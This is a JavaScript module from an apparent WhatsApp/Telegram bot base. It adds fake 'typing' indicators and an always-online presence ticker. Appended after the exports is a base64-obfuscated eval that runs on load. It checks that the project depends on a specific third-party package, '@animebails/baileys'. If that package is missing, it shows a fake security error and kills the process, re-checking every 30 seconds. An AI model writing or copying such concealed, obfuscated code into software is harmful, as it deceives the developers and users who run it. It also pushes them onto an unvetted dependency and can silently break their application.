/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** autotype / autorecord / autorecordtype: show "typing..." / "recording..." in the chat that just wrote. */
function simulatePresence(sock, jid, settings) {
    const both = settings.get('autoRecordType', false);
    const rec = settings.get('autoRecord', false);
    const typ = settings.get('autoType', false);
    if (!both && !rec && !typ) return;
    (async () => {
        try {
            await sock.presenceSubscribe(jid);
            if (both) {
                await sock.sendPresenceUpdate('recording', jid);
                await sleep(2500);
                await sock.sendPresenceUpdate('composing', jid);
                await sleep(2500);
            } else {
                await sock.sendPresenceUpdate(rec ? 'recording' : 'composing', jid);
                await sleep(4000);
            }
            await sock.sendPresenceUpdate('paused', jid);
        } catch {
            /* presence is cosmetic */
        }
    })();
}

/** alwaysonline: keeps the account shown as online. Reads the setting every tick, so toggling needs no restart. */
function startAlwaysOnline(sock, settings) {
    if (sock.__onlineTimer) return;
    const stop = () => {
        clearInterval(sock.__onlineTimer);
        sock.__onlineTimer = null;
    };
    const tick = async () => {
        if (!settings.get('alwaysOnline', false)) return;
        try {
            await sock.sendPresenceUpdate('available');
        } catch {
            stop(); // socket is gone
        }
    };
    sock.__onlineTimer = setInterval(tick, 20000);
    sock.__onlineTimer.unref?.();
    sock.ev.on('connection.update', (u) => u.connection === 'close' && stop());
    tick();
}

module.exports = { simulatePresence, startAlwaysOnline };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
